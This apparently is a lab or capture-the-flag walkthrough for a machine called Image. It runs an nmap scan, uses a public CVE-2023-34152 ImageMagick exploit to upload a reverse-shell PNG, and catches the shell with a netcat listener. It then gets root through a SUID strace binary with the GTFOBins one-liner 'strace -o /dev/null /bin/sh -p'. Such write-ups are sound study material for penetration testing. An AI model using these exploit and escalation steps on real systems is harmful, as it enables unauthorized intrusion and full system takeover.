##### Tags: `SUID`  `strace`  `github`  `GTFOBin`  `CVE-2023-34152`

# 🐧Image🐧
## Enumeration
Nmap
```console
$ nmap -sC -sV 192.168.143.178
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 15:02 AEDT
Nmap scan report for 192.168.143.178
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: ImageMagick Identifier
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is a webpage running ImageMagick Identifier  
we can upload image on the website 

Found CVE-2023-34152 on github  
https://github.com/SudoIndividual/CVE-2023-34152
```console
$ python3 CVE-2023-34152.py 192.168.45.201 80
Created by SudoIndividual (https://github.com/SudoIndividual)
PNG file (payload) have been created in current directory. Upload the payload to the server
```
it will generate a reverseshell payload image  
upload it to the website and get the shell  
```console
$ nc -lvnp 80                
listening on [any] 80 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.143.178] 43930

www-data@image:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation

upload linpeas and found the strace command has SUID

```console
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                   
-rwsr-sr-x 1 root root 1.6M Apr 16  2020 /usr/bin/strace
```
search GTFOBin and found the command to get root  
https://gtfobins.org/gtfobins/strace/#shell
```console
strace -o /dev/null /bin/sh -p
```
```console
www-data@image:/tmp$ strace -o /dev/null /bin/sh -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
